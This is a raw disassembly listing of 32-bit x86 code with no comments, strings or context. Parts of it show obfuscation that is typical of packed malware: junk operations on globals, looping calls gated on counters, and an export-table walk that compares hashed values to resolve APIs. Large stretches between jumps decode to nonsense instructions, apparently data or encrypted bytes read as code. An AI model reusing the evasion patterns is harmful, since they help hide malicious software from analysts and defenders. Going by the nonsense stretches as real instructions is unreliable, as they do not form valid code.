  4100d7:	mov    ds:0x4336df,eax
  4100dc:	cmp    DWORD PTR ds:0x4336df,0x1a
  4100e3:	jae    0x41011c
  4100e9:	cmp    DWORD PTR ds:0x4336df,0x4
  4100f0:	jne    0x4100ff
  4100f6:	push   DWORD PTR [ebp-0x20]
  4100f9:	call   DWORD PTR ds:0x4120d4
  4100ff:	cmp    DWORD PTR ds:0x4336df,0x3
  410106:	jne    0x410117
  41010c:	mov    eax,ds:0x4336df
  410111:	inc    eax
  410112:	mov    ds:0x4336df,eax
  410117:	jmp    0x4100d1
  41011c:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  410123:	sbb    eax,DWORD PTR ds:0x433773
  410129:	mov    ecx,DWORD PTR [ebp-0x4]
  41012c:	push   ebx
  41012d:	mov    eax,0x7510853
  410132:	dec    ebx
  410133:	xor    ecx,eax
  410135:	or     DWORD PTR ds:0x433657,0x33e5
  41013f:	mov    ebx,0x32729a
  410144:	sbb    DWORD PTR ds:0x4336df,0x4336e3
  41014e:	add    ecx,ebx
  410150:	and    DWORD PTR ds:0x43364f,0x433647
  41015a:	mov    DWORD PTR [ebp-0x1c],ecx
  41015d:	mov    ecx,DWORD PTR [ebp+0x14]
  410160:	sub    DWORD PTR ds:0x4336e7,0x6109
  41016a:	push   esi
  41016b:	push   edi
  41016c:	sbb    DWORD PTR ds:0x433723,0x433757
  410176:	test   ecx,ecx
  410178:	je     0x410196
  41017e:	mov    DWORD PTR ds:0x433757,0x2f8
  410188:	mov    ecx,DWORD PTR [ebp+0x14]
  41018b:	mov    ecx,DWORD PTR [ecx]
  41018d:	and    edi,DWORD PTR ds:0x433697
  410193:	mov    DWORD PTR [ebp-0x1c],ecx
  410196:	add    DWORD PTR ds:0x433723,0x2cfa
  4101a0:	imul   edx,eax
  4101a3:	add    DWORD PTR ds:0x433657,edx
  4101a9:	mov    ecx,0x4573
  4101ae:	xor    edi,edi
  4101b0:	or     edi,DWORD PTR ds:0x433777
  4101b6:	mov    esi,DWORD PTR ds:0x43378b
  4101bc:	sub    edi,esi
  4101be:	xor    edi,DWORD PTR [edi+esi*1]
  4101c1:	add    edx,ecx
  4101c3:	sub    DWORD PTR ds:0x433663,0x43369b
  4101cd:	mov    esi,0x7879
  4101d2:	mov    edi,0x1556
  4101d7:	xchg   esi,ecx
  4101d9:	and    DWORD PTR ds:0x433733,0x0
  4101e3:	mov    ecx,DWORD PTR ds:0x433733
  4101e9:	inc    ecx
  4101ea:	mov    DWORD PTR ds:0x433733,ecx
  4101f0:	cmp    DWORD PTR ds:0x433733,0x29
  4101f7:	jne    0x41023f
  4101fd:	push   0x433914
  410202:	push   DWORD PTR [ebp-0x14]
  410205:	push   DWORD PTR [ebp-0xc]
  410208:	push   0x8a72
  41020d:	push   0x8052
  410212:	push   0x5318
  410217:	push   0x69ba
  41021c:	push   0x74de
  410221:	push   0x7da6
  410226:	push   DWORD PTR [ebp-0x1c]
  410229:	push   DWORD PTR [ebp-0x24]
  41022c:	push   DWORD PTR [ebp-0x18]
  41022f:	push   0x2962
  410234:	push   0x6ae2
  410239:	call   DWORD PTR ds:0x4120d8
  41023f:	cmp    DWORD PTR ds:0x433733,0x1c
  410246:	jb     0x4101e3
  41024c:	sub    edx,edi
  41024e:	adc    DWORD PTR ds:0x433763,edi
  410254:	xor    esi,esi
  410256:	and    DWORD PTR ds:0x433757,0x0
  410260:	mov    ecx,DWORD PTR ds:0x433757
  410266:	inc    ecx
  410267:	mov    DWORD PTR ds:0x433757,ecx
  41026d:	cmp    DWORD PTR ds:0x433757,0xf
  410274:	jne    0x410288
  41027a:	push   DWORD PTR [ebp-0x10]
  41027d:	push   0x178b
  410282:	call   DWORD PTR ds:0x4121c0
  410288:	cmp    DWORD PTR ds:0x433757,0xe
  41028f:	jne    0x4102a4
  410295:	xor    ecx,ecx
  410297:	xor    ecx,DWORD PTR ds:0x433757
  41029d:	inc    ecx
  41029e:	mov    DWORD PTR ds:0x433757,ecx
  4102a4:	cmp    DWORD PTR ds:0x433757,0x1b
  4102ab:	jb     0x410260
  4102b1:	inc    ecx
  4102b2:	mov    DWORD PTR [ebp-0x28],esi
  4102b5:	not    ecx
  4102b7:	mov    DWORD PTR [ebp-0x2c],esi
  4102ba:	and    DWORD PTR ds:0x433723,0x0
  4102c4:	xor    ecx,ecx
  4102c6:	xor    ecx,DWORD PTR ds:0x433723
  4102cc:	inc    ecx
  4102cd:	mov    DWORD PTR ds:0x433723,ecx
  4102d3:	cmp    DWORD PTR ds:0x433723,0x22
  4102da:	jne    0x4102e9
  4102e0:	push   DWORD PTR [ebp-0x1c]
  4102e3:	call   DWORD PTR ds:0x412284
  4102e9:	cmp    DWORD PTR ds:0x433723,0x17
  4102f0:	jb     0x4102c4
  4102f6:	add    ecx,DWORD PTR ds:0x4336eb
  4102fc:	mov    DWORD PTR [ebp-0x14],esi
  4102ff:	mov    DWORD PTR [ebp-0x8],esi
  410302:	sub    DWORD PTR ds:0x43372b,0x6d7d
  41030c:	mov    ecx,DWORD PTR [ebp-0x18]
  41030f:	xor    DWORD PTR ds:0x4336e3,0x433647
  410319:	xor    ecx,eax
  41031b:	and    DWORD PTR ds:0x433733,0x0
  410325:	mov    eax,ds:0x433733
  41032a:	inc    eax
  41032b:	mov    ds:0x433733,eax
  410330:	cmp    DWORD PTR ds:0x433733,0xd
  410337:	jne    0x410348
  41033d:	push   0x8573
  410342:	call   DWORD PTR ds:0x4120dc
  410348:	cmp    DWORD PTR ds:0x433733,0xc
  41034f:	jne    0x410360
  410355:	mov    eax,ds:0x433733
  41035a:	inc    eax
  41035b:	mov    ds:0x433733,eax
  410360:	cmp    DWORD PTR ds:0x433733,0x18
  410367:	jb     0x410325
  41036d:	xor    eax,0x75f4
  410372:	xor    edi,edi
  410374:	mov    eax,ds:0x4336e3
  410379:	sbb    eax,DWORD PTR ds:0x433763
  41037f:	mov    ds:0x4336e3,eax
  410384:	add    ecx,ebx
  410386:	movzx  eax,BYTE PTR ds:0x4336ab
  41038d:	mov    DWORD PTR [ebp-0x20],ecx
  410390:	mov    eax,DWORD PTR [ebp-0x20]
  410393:	mov    DWORD PTR ds:0x433667,0x63b9
  41039d:	je     0x410967
  4103a3:	and    DWORD PTR ds:0x433647,0x0
  4103ad:	jmp    0x4103c0
  4103b2:	xor    eax,eax
  4103b4:	xor    eax,DWORD PTR ds:0x433647
  4103ba:	inc    eax
  4103bb:	mov    ds:0x433647,eax
  4103c0:	cmp    DWORD PTR ds:0x433647,0x14
  4103c7:	jae    0x410465
  4103cd:	cmp    DWORD PTR ds:0x433647,0xd
  4103d4:	jne    0x4103e6
  4103da:	push   DWORD PTR [ebp-0x20]
  4103dd:	push   DWORD PTR [ebp-0x18]
  4103e0:	call   DWORD PTR ds:0x412288
  4103e6:	cmp    DWORD PTR ds:0x433647,0xc
  4103ed:	jne    0x4103fe
  4103f3:	mov    eax,ds:0x433647
  4103f8:	inc    eax
  4103f9:	mov    ds:0x433647,eax
  4103fe:	jmp    0x4103b2
  410403:	mov    DWORD PTR ds:0x433757,0x1e
  41040d:	cmp    DWORD PTR ds:0x433757,0x0
  410414:	je     0x410465
  41041a:	cmp    DWORD PTR ds:0x433757,0x4
  410421:	jne    0x41043a
  410427:	push   DWORD PTR [ebp-0xc]
  41042a:	push   0x433974
  41042f:	push   0x43365f
  410434:	call   DWORD PTR ds:0x4121c4
  41043a:	cmp    DWORD PTR ds:0x433757,0x5
  410441:	jne    0x410452
  410447:	mov    eax,ds:0x433757
  41044c:	dec    eax
  41044d:	mov    ds:0x433757,eax
  410452:	xor    eax,eax
  410454:	add    eax,DWORD PTR ds:0x433757
  41045a:	dec    eax
  41045b:	mov    ds:0x433757,eax
  410460:	jmp    0x41040d
  410465:	mov    eax,DWORD PTR [ebp-0x4]
  410468:	xor    eax,0x7510853
  41046d:	sub    DWORD PTR ds:0x433757,0xdb8
  410477:	add    eax,ebx
  410479:	mov    DWORD PTR ds:0x4336a7,0x3f77
  410483:	cmp    edi,eax
  410485:	jne    0x4107cf
  41048b:	sub    DWORD PTR ds:0x43369b,0x29bd
  410495:	push   DWORD PTR [ebp+0x8]
  410498:	call   0x40f639
  41049d:	inc    ecx
  41049e:	mov    DWORD PTR [ebp-0x20],eax
  4104a1:	adc    DWORD PTR ds:0x4336e3,0xc37
  4104ab:	jmp    0x4105e6
  4104b0:	sbb    eax,0xb1fd9f18
  4104b5:	jge    0x410514
  4104b7:	fsub   DWORD PTR [edx+0xa]
  4104ba:	adc    ecx,ebx
  4104bc:	enter  0x9ed,0xd
  4104c0:	cdq    
  4104c1:	mov    esi,0x7f127c7c
  4104c6:	jl     0x410544
  4104c8:	ffreep st(6)
  4104ca:	fwait
  4104cb:	xchg   ebp,eax
  4104cc:	xchg   ecx,eax
  4104cd:	xor    bh,BYTE PTR [esi]
  4104cf:	imul   eax,ebp,0x43
  4104d2:	or     al,0x77
  4104d4:	pop    ds
  4104d5:	xor    eax,0xf59ffdee
  4104da:	pushf  
  4104db:	bound  esi,QWORD PTR [eax+eiz*1]
  4104de:	xor    ch,BYTE PTR [ebp-0x677c1722]
  4104e4:	cmp    DWORD PTR [ebp+0x4c228953],esi
  4104ea:	icebp  
  4104eb:	pop    esp
  4104ec:	xchg   edi,eax
  4104ed:	ret    
  4104ee:	and    eax,0xc88d735d
  4104f3:	xor    al,0x77
  4104f5:	or     bl,0x73
  4104f8:	ror    BYTE PTR [edi-0x4bf4bc95],cl
  4104fe:	in     al,0xfa
  410500:	shr    DWORD PTR [ecx-0x4cfd79fb],0x50
  410507:	das    
  410508:	sub    bh,BYTE PTR [eax]
  41050a:	mov    ds:0xe564d007,al
  41050f:	(bad)  
  410510:	std    
  410511:	stc    
  410512:	jge    0x4104b1
  410514:	call   0x9302:0xa019599
  41051b:	mov    ds:0xd85640d3,al
  410520:	test   BYTE PTR [ecx*4+0x57523b7b],ah
  410527:	mov    ds,ebp
  410529:	push   es
  41052a:	mov    ds:0x623ece33,al
  41052f:	push   esi
  410530:	mov    eax,DWORD PTR ds:[ebp+0x62]
  410534:	inc    esp
  410535:	in     al,0xb6
  410537:	inc    eax
  410538:	repz inc ebp
  41053a:	and    eax,0x9cb139e5
  41053f:	data16 mov ds:0x2a06d31e,al
  410545:	arpl   WORD PTR [bp+di-0x3b],cx
  410549:	xchg   ecx,eax
  41054a:	shl    DWORD PTR [esi],0x94
  41054d:	adc    ebx,DWORD PTR [edx+0x5d]
  410550:	add    eax,0x17188826
  410555:	push   esi
  410556:	inc    ecx
  410557:	shl    esp,1
  410559:	rcr    BYTE PTR [edi+0x11],cl
  41055c:	ins    DWORD PTR es:[edi],dx
  41055d:	inc    ecx
  41055e:	cli    
  41055f:	add    BYTE PTR [ebx+0x4045157f],ah
  410565:	pop    ebx
  410566:	xlat   BYTE PTR ds:[ebx]
  410567:	adc    edx,DWORD PTR [ecx-0x756104ac]
  41056d:	push   edx
  41056e:	push   ecx
  41056f:	mov    esi,DWORD PTR [ebp+edi*8+0x4b]
  410573:	aaa    
  410574:	into   
  410575:	push   es
  410576:	out    0xb,al
  410578:	popa   
  410579:	and    dl,BYTE PTR [ebx+0x22c8f9f7]
  41057f:	shl    DWORD PTR [ecx+edi*1-0x5cc122b5],cl
  410586:	inc    edi
  410587:	dec    edi
  410588:	fsub   DWORD PTR [esi-0x21]
  41058b:	lods   al,BYTE PTR ds:[esi]
  41058c:	pop    esi
  41058d:	fwait
  41058e:	pusha  
  41058f:	adc    eax,DWORD PTR [eax-0x20]
  410592:	push   edi
  410593:	jmp    0xea1cf73
  410598:	pop    ds
  410599:	cwde   
  41059a:	dec    eax
  41059b:	fidiv  DWORD PTR [esi+0x74710d04]
  4105a1:	out    dx,eax
  4105a2:	or     BYTE PTR [eax-0x72204c28],0x11
  4105a9:	ss push eax
  4105ab:	cmc    
  4105ac:	(bad)  
  4105ad:	call   DWORD PTR ds:0x56de3305
  4105b3:	push   ebp
  4105b4:	imul   ebx,DWORD PTR [ebp-0x7b],0xffffffdc
  4105b8:	mov    esp,edx
  4105ba:	mov    al,0x99
  4105bc:	out    0x32,eax
  4105be:	dec    esi
  4105bf:	push   esp
  4105c0:	sbb    edx,DWORD PTR [edi]
  4105c2:	ins    BYTE PTR es:[edi],dx
  4105c3:	lahf   
  4105c4:	rol    DWORD PTR [edx+esi*8-0x72221200],0xbe
  4105cc:	inc    DWORD PTR [edx+0x2c0560f1]
  4105d2:	cmp    DWORD PTR [edi-0x17],edi
  4105d5:	sub    esp,esp
  4105d7:	ja     0x410571
  4105d9:	loop   0x410620
  4105db:	inc    esp
  4105dc:	inc    ebp
  4105dd:	cs or  eax,esp
  4105e0:	push   ebp
  4105e1:	nop
  4105e2:	pop    ecx
  4105e3:	mov    eax,ds:0x458b7220
  4105e8:	cld    
  4105e9:	sbb    DWORD PTR ds:0x4336d7,0x55ce
  4105f3:	mov    ecx,DWORD PTR [ebp-0x20]
  4105f6:	adc    DWORD PTR ds:0x43364f,ebx
  4105fc:	mov    esi,0x7510853
  410601:	xor    eax,esi
  410603:	dec    DWORD PTR ds:0x43372f
  410609:	add    eax,ebx
  41060b:	cmp    ecx,eax
  41060d:	je     0x41094b
  410613:	add    DWORD PTR ds:0x43372f,0x3520
  41061d:	push   DWORD PTR [ebp-0x20]
  410620:	push   DWORD PTR [ebp+0x8]
  410623:	call   0x405227
  410628:	mov    DWORD PTR [ebp-0x14],eax
  41062b:	adc    eax,ecx
  41062d:	mov    eax,DWORD PTR [ebp-0x4]
  410630:	and    DWORD PTR ds:0x4336df,edi
  410636:	jmp    0x410771
  41063b:	pop    ss
  41063c:	imul   ecx,DWORD PTR ds:0x7d706d64,0xb02edf69
  410646:	loope  0x41062f
  410648:	addr16 mov cl,0x7e
  41064b:	mov    edi,0x127c7cb9
  410650:	jg     0x4106ce
  410652:	jl     0x410631
  410654:	out    dx,eax
  410655:	arpl   di,cx
  410657:	sti    
  410658:	xchg   ebx,eax
  410659:	cmc    
  41065a:	sbb    DWORD PTR [ecx+esi*2-0x76],ebp
  41065e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41065f:	es dec ecx
  410661:	pop    edi
  410662:	test   BYTE PTR [edx-0xb5feb41],0x3
  410669:	sub    edx,DWORD PTR [ebx+0x1d2ac39b]
  41066f:	push   ebx
  410670:	inc    ebx
  410671:	icebp  
  410672:	xor    DWORD PTR [edx-0x15451313],ebp
  410678:	jmp    0xc70:0xbd74f611
  41067f:	inc    edx
  410680:	pusha  
  410681:	xor    DWORD PTR [edx+0x11d914a7],ebx
  410687:	das    
  410688:	dec    ebp
  410689:	cs in  al,0xdf
  41068c:	ins    BYTE PTR es:[edi],dx
  41068d:	xlat   BYTE PTR ds:[ebx]
  41068e:	int3   
  41068f:	mov    edi,0xf2af9f3b
  410694:	push   edx
  410695:	push   0x880b918e
  41069a:	xor    eax,0x746a9378
  41069f:	nop
  4106a0:	stos   BYTE PTR es:[edi],al
  4106a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106a2:	pop    esi
  4106a3:	pusha  
  4106a4:	mov    es,WORD PTR [edi+0x6c]
  4106a7:	fwait
  4106a8:	repz add cl,cl
  4106ab:	pusha  
  4106ac:	push   edi
  4106ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106ae:	sbb    eax,0x43d76fab
  4106b3:	sbb    bh,BYTE PTR [ecx+0x50cb74e3]
  4106b9:	pop    ebx
  4106ba:	addr16 mov al,ds:0x16f5
  4106be:	ret    
  4106bf:	sbb    BYTE PTR [esi+0x34],0x7a
  4106c3:	rol    DWORD PTR [ecx-0x4b4cdc75],0x7a
  4106ca:	mov    WORD PTR [eax+0x46],gs
  4106cd:	push   ecx
  4106ce:	sar    DWORD PTR [ebx+0x7d],1
  4106d1:	adc    DWORD PTR [ebx-0x56c6b9b1],esi
  4106d7:	je     0x4106e3
  4106d9:	xor    DWORD PTR [esi+0x50c81d02],ecx
  4106df:	outs   dx,BYTE PTR ds:[esi]
  4106e0:	or     eax,0xab66bda2
  4106e5:	pop    ebx
  4106e6:	pop    es
  4106e7:	inc    edx
  4106e8:	pop    ebx
  4106e9:	mov    ecx,0x6a491427
  4106ee:	jl     0x4106c4
  4106f0:	mov    ds:0xd6edcd44,eax
  4106f5:	fisttp DWORD PTR [ebx+0x2c]
  4106f8:	xchg   ebp,eax
  4106f9:	xchg   edi,eax
  4106fa:	imul   BYTE PTR [ecx+0x3edf955b]
  410700:	jo     0x4106c5
  410702:	imul   edx,eax,0x46f60384
  410708:	pushf  
  410709:	jns    0x410721
  41070b:	mov    ds:0x7c9e5cf4,eax
  410710:	test   DWORD PTR [ecx+0x7bd8fc17],esi
  410716:	rcr    DWORD PTR [edx-0x225b751c],1
  41071c:	fs std 
  41071e:	lods   eax,DWORD PTR ds:[esi]
  41071f:	iret   
  410720:	push   ss
  410721:	(bad)  
  410722:	push   ds
  410723:	shl    BYTE PTR ds:0x480c996c,cl
  410729:	mov    eax,ds:0x3fa8e463
  41072e:	inc    edx
  41072f:	mov    dl,0x29
  410731:	and    eax,esp
  410733:	xchg   ebx,eax
  410734:	xor    al,0xae
  410736:	push   0xa
  410738:	mov    fs,WORD PTR [edx+eiz*8-0x7f]
  41073c:	stos   BYTE PTR es:[edi],al
  41073d:	push   cs
  41073e:	cli    
  41073f:	jae    0x41071c
  410741:	adc    eax,0xb6bfaed1
  410746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410747:	and    DWORD PTR [ebx-0x427cc5d6],esp
  41074d:	mov    dh,0xff
  41074f:	sbb    ch,0x95
  410752:	mov    ds:0x103433a9,eax
  410757:	adc    bl,bh
  410759:	cdq    
  41075a:	nop
  41075b:	xchg   ecx,ecx
  41075d:	(bad)  
  41075e:	scas   al,BYTE PTR es:[edi]
  41075f:	and    al,0x35
  410761:	mov    bh,0xb3
  410763:	xor    al,0x87
  410765:	scas   al,BYTE PTR es:[edi]
  410766:	ds jle 0x41070b
  410769:	or     eax,0x41b0af13
  41076e:	xor    al,BYTE PTR [ecx+ecx*2]
  410771:	mov    ecx,DWORD PTR [ebp-0x14]
  410774:	add    DWORD PTR ds:0x433667,0x3989
  41077e:	xor    eax,esi
  410780:	sbb    DWORD PTR ds:0x433663,0x43364f
  41078a:	add    eax,ebx
  41078c:	cmp    ecx,eax
  41078e:	je     0x41094b
  410794:	mov    eax,DWORD PTR [ebp-0x14]
  410797:	xor    DWORD PTR ds:0x4336a3,edi
  41079d:	mov    eax,DWORD PTR [eax+0x18]
  4107a0:	sub    ecx,DWORD PTR ds:0x433763
  4107a6:	mov    DWORD PTR [ebp-0x20],eax
  4107a9:	mov    eax,DWORD PTR [ebp-0x14]
  4107ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4107af:	add    ecx,DWORD PTR [eax+0x20]
  4107b2:	mov    DWORD PTR [ebp-0x28],ecx
  4107b5:	mov    eax,DWORD PTR [ebp-0x14]
  4107b8:	mov    ecx,DWORD PTR [ebp+0x8]
  4107bb:	add    ecx,DWORD PTR [eax+0x24]
  4107be:	mov    DWORD PTR [ebp-0x2c],ecx
  4107c1:	mov    eax,DWORD PTR [ebp-0x14]
  4107c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4107c7:	add    ecx,DWORD PTR [eax+0x1c]
  4107ca:	xor    esi,esi
  4107cc:	mov    DWORD PTR [ebp-0x14],ecx
  4107cf:	mov    eax,DWORD PTR [ebp-0x28]
  4107d2:	jmp    0x41090d
  4107d7:	push   ebp
  4107d8:	xchg   esi,eax
  4107d9:	ins    BYTE PTR es:[edi],dx
  4107da:	stos   DWORD PTR es:[edi],eax
  4107db:	jae    0x41085a
  4107dd:	push   ebp
  4107de:	jbe    0x4107cf
  4107e0:	mov    ds:0x9b7aac5a,eax
  4107e5:	(bad)  
  4107e6:	xchg   DWORD PTR [ebp-0x48],ebx
  4107e9:	jl     0x410867
  4107eb:	adc    bh,BYTE PTR [edi+0x7c]
  4107ee:	jl     0x410786
  4107f0:	adc    al,ch
  4107f2:	mov    dh,0xb0
  4107f4:	(bad)  
  4107f6:	add    dh,al
  4107f8:	inc    ebp
  4107f9:	ficom  WORD PTR [ebp+0x21303ced]
  4107ff:	pop    edx
  410800:	sub    cl,cl
  410802:	jecxz  0x410838
  410804:	fwait
  410805:	mov    cl,bh
  410807:	into   
  410808:	loop   0x41078d
  41080a:	int    0x3b
  41080c:	jae    0x4107a1
  41080e:	shl    edi,1
  410810:	icebp  
  410811:	adc    eax,0x647ace1b
  410816:	add    esi,DWORD PTR [ebx]
  410818:	ins    DWORD PTR es:[edi],dx
  410819:	inc    ebp
  41081a:	xchg   edx,eax
  41081b:	add    dl,al
  41081d:	out    dx,al
  41081e:	mov    ecx,0x2552548b
  410823:	push   cs
  410824:	ins    DWORD PTR es:[edi],dx
  410825:	xchg   esi,eax
  410826:	dec    ebp
  410827:	mov    BYTE PTR [edx+ecx*2+0x38],0xd4
  41082c:	lods   al,BYTE PTR ds:[esi]
  41082d:	push   ss
  41082e:	pop    esp
  41082f:	mov    esi,0x22a4fa8b
  410834:	pop    ecx
  410835:	outs   dx,BYTE PTR ds:[esi]
  410836:	call   0x8cde6c61
  41083b:	dec    ebp
  41083c:	dec    eax
  41083d:	mov    ecx,0xd50ff2c4
  410842:	bound  edx,QWORD PTR ds:0xe8605440
  410848:	cli    
  410849:	and    ah,BYTE PTR [eax+eax*8-0x16d0ae5d]
  410850:	lock pop DWORD PTR [ecx]
  410853:	cmp    eax,0xc4fe955a
  410858:	int    0xd4
  41085a:	jmp    0xd0f1928f
  41085f:	and    al,0x93
  410861:	mul    DWORD PTR [ebp+0x5ed6b818]
  410867:	into   
  410868:	pop    ds
  410869:	cmp    BYTE PTR [ecx+0x5ceaf7d9],dh
  41086f:	not    DWORD PTR [ebp-0x273c1070]
  410875:	int    0x7c
  410877:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410879:	add    bl,BYTE PTR [ecx+0x3027801f]
  41087f:	cwde   
  410880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410881:	or     BYTE PTR [ebp+0x1c4e4c9a],dl
  410887:	mov    ds:0x55938250,al
  41088c:	mov    ds:0x629c25fc,al
  410891:	lods   al,BYTE PTR ds:[esi]
  410892:	dec    ebx
  410893:	pop    ecx
  410894:	jno    0x4108a7
  410896:	aad    0x7d
  410898:	popa   
  410899:	xor    eax,0x671d255e
  41089e:	in     al,dx
  41089f:	fwait
  4108a0:	sbb    DWORD PTR ds:0xc11738c9,ebp
  4108a6:	das    
  4108a7:	aas    
  4108a8:	push   ebp
  4108a9:	mov    ebp,0x5fe8854
  4108ae:	retf   
  4108af:	fisttp WORD PTR [ecx-0x62]
  4108b2:	and    eax,0xdecd310e
  4108b7:	sbb    DWORD PTR [esi+0x59846c9a],0x3e
  4108be:	aas    
  4108bf:	in     al,0xb1
  4108c1:	cmp    al,0x38
  4108c3:	les    edx,FWORD PTR [ebx]
  4108c5:	xor    DWORD PTR ds:0x17e409de,edi
  4108cb:	push   cs
  4108cc:	data16 aad 0x42
  4108cf:	mov    ecx,0x45acb9ae
  4108d4:	or     eax,DWORD PTR [eax]
  4108d6:	adc    ecx,ebp
  4108d8:	and    al,0x4f
  4108da:	int3   
  4108db:	jno    0x4108ad
  4108dd:	mov    ah,0x3b
  4108df:	xchg   DWORD PTR [eax-0x4429eb57],eax
  4108e5:	xor    al,0xf9
  4108e7:	or     ecx,eax
  4108e9:	xchg   esp,eax
  4108ea:	mov    ds:0x141383bd,eax
  4108ef:	jg     0x410923
  4108f1:	jae    0x410971
  4108f3:	shl    DWORD PTR gs:0xc88a29ef,cl
  4108fa:	push   edx
  4108fb:	loope  0x4108ae
  4108fd:	(bad)  
  4108fe:	push   eax
  4108ff:	test   DWORD PTR [eax-0x75],0x1a87fca4
  410906:	mov    eax,ds:0x909c4597
  41090b:	pushf  
  41090c:	jae    0x410899
  41090e:	dec    ebp
  41090f:	or     BYTE PTR [ebx],al
  410911:	or     al,0xb8
  410913:	lea    eax,[ebp-0x8]
  410916:	mov    DWORD PTR [ebp-0x30],ecx
  410919:	push   eax
  41091a:	push   DWORD PTR [ebp-0x30]
  41091d:	push   DWORD PTR [ebp+0xc]
  410920:	call   0x4040e1
  410925:	mov    eax,DWORD PTR [ebp-0x4]
  410928:	mov    ecx,DWORD PTR [ebp-0x8]
  41092b:	xor    eax,0x7510853
  410930:	add    eax,ebx
  410932:	cmp    ecx,eax
  410934:	jne    0x410957
  41093a:	mov    eax,DWORD PTR [ebp-0x20]
  41093d:	inc    edi
  41093e:	cmp    edi,eax
  410940:	jb     0x4103a3
  410946:	jmp    0x410967
  41094b:	mov    eax,DWORD PTR [ebp-0x4]
  41094e:	xor    eax,esi
  410950:	add    eax,ebx
  410952:	jmp    0x41148d
  410957:	mov    eax,DWORD PTR [ebp-0x2c]
  41095a:	movzx  eax,WORD PTR [eax+edi*2]
  41095e:	mov    ecx,DWORD PTR [ebp-0x14]
  410961:	mov    eax,DWORD PTR [ecx+eax*4]
  410964:	mov    DWORD PTR [ebp+0xc],eax
  410967:	mov    eax,DWORD PTR [ebp-0x4]
  41096a:	mov    ecx,DWORD PTR [ebp-0x8]
  41096d:	xor    eax,0x7510853
  410972:	add    eax,ebx
  410974:	cmp    ecx,eax
  410976:	jne    0x410989
  41097c:	mov    eax,DWORD PTR [ebp-0x4]
  41097f:	xor    eax,0x7510853
  410984:	jmp    0x410950
  410989:	mov    eax,DWORD PTR [ebp+0xc]
  41098c:	jmp    0x410ac7
  410991:	inc    ebx
  410992:	fs dec edi
  410994:	fwait
  410995:	imul   esi,DWORD PTR [ebx-0x6cde9b8d],0x78
  41099c:	or     BYTE PTR [eax+0x7393c9fc],ah
  4109a2:	mov    ebx,0x7f127c7c
  4109a7:	jl     0x410a25
  4109a9:	clc    
  4109aa:	cmp    DWORD PTR [ecx-0x7efced58],eax
  4109b0:	(bad)  
  4109b2:	fdivp  st(7),st
  4109b4:	dec    esp
  4109b5:	mov    ah,0x1e
  4109b7:	push   0xffffffc8
  4109b9:	ficomp DWORD PTR [ebx+0xe628742]
  4109bf:	ficomp DWORD PTR [ecx]
  4109c1:	jle    0x41095a
  4109c3:	pop    ebx
  4109c4:	jl     0x410967
  4109c6:	jp     0x410996
  4109c8:	sub    edi,DWORD PTR [ebx-0x2df3c532]
  4109ce:	adc    eax,esi
  4109d0:	test   eax,0x5a514121
  4109d5:	push   cs
  4109d6:	aaa    
  4109d7:	or     DWORD PTR [ecx+0x0],ebp
  4109da:	outs   dx,BYTE PTR ds:[esi]
  4109db:	dec    ebp
  4109dc:	jmp    0xc0db93da
  4109e1:	mov    bh,0x94
  4109e3:	scas   al,BYTE PTR es:[edi]
  4109e4:	adc    al,0x13
  4109e6:	pop    ss
  4109e7:	sbb    BYTE PTR [esp+edi*8+0x7c2d302c],al
  4109ee:	shl    BYTE PTR [eax],cl
  4109f0:	mov    edi,0x2700f146
  4109f5:	hlt    
  4109f6:	or     dl,bh
  4109f8:	ds mov dh,0xce
  4109fb:	bound  edi,QWORD PTR [eax-0x155ceada]
  410a01:	jbe    0x410a64
  410a03:	mov    dl,0xc7
  410a05:	pop    eax
  410a06:	jns    0x410a1b
  410a08:	fistp  QWORD PTR [edx+esi*8-0x74df620d]
  410a0f:	pop    ebp
  410a10:	sbb    bl,BYTE PTR [eax-0x67e8605e]
  410a16:	sbb    al,0x9a
  410a18:	lds    eax,FWORD PTR ds:0x66d864bb
  410a1e:	ret    0x848
  410a21:	dec    esp
  410a22:	dec    esi
  410a23:	cmp    al,0x87
  410a25:	lahf   
  410a26:	ficomp DWORD PTR ds:0x396ed883
  410a2c:	inc    edi
  410a2d:	cld    
  410a2e:	jno    0x410a20
  410a30:	or     cl,bh
  410a32:	mov    edi,ss
  410a34:	dec    edi
  410a35:	scas   eax,DWORD PTR es:[edi]
  410a36:	sar    ecx,1
  410a38:	not    BYTE PTR [ecx-0x4f]
  410a3b:	imul   BYTE PTR [eax]
  410a3d:	test   BYTE PTR [ecx+0x2e],ah
  410a40:	ret    0x5465
  410a43:	xchg   ebp,eax
  410a44:	or     ebx,DWORD PTR [ebx]
  410a46:	mov    esi,0x899b24b
  410a4b:	mul    DWORD PTR [esi+ecx*2+0x1a82ced1]
  410a52:	inc    ecx
  410a53:	adc    DWORD PTR [esi],esp
  410a55:	and    eax,0x83ab534f
  410a5a:	ins    DWORD PTR es:[edi],dx
  410a5b:	leave  
  410a5c:	jmp    0x410ac4
  410a5e:	pop    ds
  410a5f:	ret    
  410a60:	push   esp
  410a61:	out    dx,eax
  410a62:	test   al,0x5a
  410a64:	ror    BYTE PTR [edx+0x3bf5265c],1
  410a6a:	stc    
  410a6b:	jecxz  0x410a2f
  410a6d:	jmp    0xb701:0x12411e18
  410a74:	cmp    edx,esp
  410a76:	mov    esp,DWORD PTR [ebp+0x64]
  410a79:	push   esi
  410a7a:	mov    DWORD PTR [ebp+0x6b20281d],ebx
  410a80:	adc    eax,0x84e8271f
  410a85:	push   0x1d
  410a87:	int3   
  410a88:	and    BYTE PTR [edx],dl
  410a8a:	mov    dl,0xce
  410a8c:	dec    edi
  410a8d:	mov    esp,esp
  410a8f:	xchg   ecx,eax
  410a90:	sar    DWORD PTR ds:0xff41d075,0x1f
  410a97:	hlt    
  410a98:	mov    dh,0xf3
  410a9a:	jmp    0x410ade
  410a9c:	push   edi
  410a9d:	outs   dx,BYTE PTR ds:[esi]
  410a9e:	xchg   ecx,eax
  410a9f:	cmp    edx,DWORD PTR [eax+0x25]
  410aa2:	jl     0x410ac9
  410aa4:	and    ebp,eax
  410aa6:	mov    ah,0xec
  410aa8:	sub    DWORD PTR [edi],edx
